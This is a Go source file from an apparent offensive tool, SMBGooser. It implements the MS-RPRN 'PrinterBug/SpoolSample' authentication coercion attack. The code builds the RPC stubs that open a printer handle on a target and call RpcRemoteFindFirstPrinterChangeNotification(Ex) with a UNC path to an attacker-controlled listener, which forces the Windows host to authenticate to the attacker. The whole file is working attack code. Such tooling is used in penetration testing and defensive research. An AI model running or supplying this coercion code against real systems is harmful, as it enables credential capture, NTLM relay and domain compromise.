package coerce

import (
	"context"

	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
)

// SpoolSample implements MS-RPRN coercion (PrinterBug/SpoolSample attack)
type SpoolSample struct{}

// NewSpoolSample creates a SpoolSample coercer
func NewSpoolSample() *SpoolSample {
	return &SpoolSample{}
}

func (s *SpoolSample) Name() string {
	return "SpoolSample"
}

func (s *SpoolSample) Description() string {
	return "MS-RPRN (Print System Remote) - RpcRemoteFindFirstPrinterChangeNotificationEx"
}

func (s *SpoolSample) PipeName() string {
	return "spoolss"
}

func (s *SpoolSample) InterfaceUUID() dcerpc.UUID {
	return dcerpc.RPRN_UUID
}

func (s *SpoolSample) InterfaceVersion() uint32 {
	return 1
}

func (s *SpoolSample) Opnums() []OpnumInfo {
	return []OpnumInfo{
		{65, "RpcRemoteFindFirstPrinterChangeNotificationEx", "Primary notification coercion"},
		{62, "RpcRemoteFindFirstPrinterChangeNotification", "Legacy notification coercion"},
	}
}

func (s *SpoolSample) Coerce(ctx context.Context, rpc *dcerpc.Client, listener string, opts CoerceOptions) error {
	// Step 1: Open printer handle (opnum 1: RpcOpenPrinter)
	// For SpoolSample, we need to first get a printer handle

	// Build printer path (\\<target> style)
	// We'll use an empty string which creates a local printer reference
	openStub := s.createOpenPrinterStub("")

	resp, err := rpc.Call(1, openStub) // RpcOpenPrinter
	if err != nil {
		return err
	}

	// Extract printer handle from response (first 20 bytes of stub data)
	if len(resp) < 20 {
		return dcerpc.ErrCallFailed
	}
	printerHandle := resp[:20]

	// Step 2: Call notification function
	opnums := s.getOpnums(opts)
	path := buildCallbackPath(listener, opts.UseHTTP, opts.HTTPPort)

	var lastErr error
	for _, opnum := range opnums {
		stub := s.createNotificationStub(printerHandle, path, opnum.Opnum)
		_, err := rpc.Call(opnum.Opnum, stub)

		if err != nil {
			if isCoercionSuccess(err) {
				return nil
			}
			lastErr = err
			continue
		}
		return nil // Success
	}

	return lastErr
}

func (s *SpoolSample) getOpnums(opts CoerceOptions) []OpnumInfo {
	if opts.SpecificOpnum >= 0 {
		for _, op := range s.Opnums() {
			if op.Opnum == uint16(opts.SpecificOpnum) {
				return []OpnumInfo{op}
			}
		}
	}
	return s.Opnums()
}

// createOpenPrinterStub creates NDR stub for RpcOpenPrinter
func (s *SpoolSample) createOpenPrinterStub(printerName string) []byte {
	w := dcerpc.NewNDRWriter()

	// pPrinterName (unique pointer + string)
	if printerName == "" {
		w.WriteNullPointer()
	} else {
		w.WritePointer()
		w.WriteUnicodeString(printerName)
	}

	// pDatatype (null)
	w.WriteNullPointer()

	// pDevModeContainer
	w.WriteUint32(0)     // cbBuf
	w.WriteNullPointer() // pDevMode

	// AccessRequired
	w.WriteUint32(0x00020000) // PRINTER_ACCESS_USE

	return w.Bytes()
}

// createNotificationStub creates NDR stub for notification functions
func (s *SpoolSample) createNotificationStub(printerHandle []byte, listener string, opnum uint16) []byte {
	w := dcerpc.NewNDRWriter()

	// hPrinter (20 bytes handle)
	w.WriteBytes(printerHandle)

	// fdwFlags
	w.WriteUint32(0)

	// fdwOptions
	w.WriteUint32(0)

	// pszLocalMachine (UNC path to attacker)
	w.WritePointer()
	w.WriteUnicodeString(listener)

	// dwPrinterLocal
	w.WriteUint32(0)

	if opnum == 65 {
		// RpcRemoteFindFirstPrinterChangeNotificationEx has additional params
		// pOptions (null)
		w.WriteNullPointer()
	}

	return w.Bytes()
}
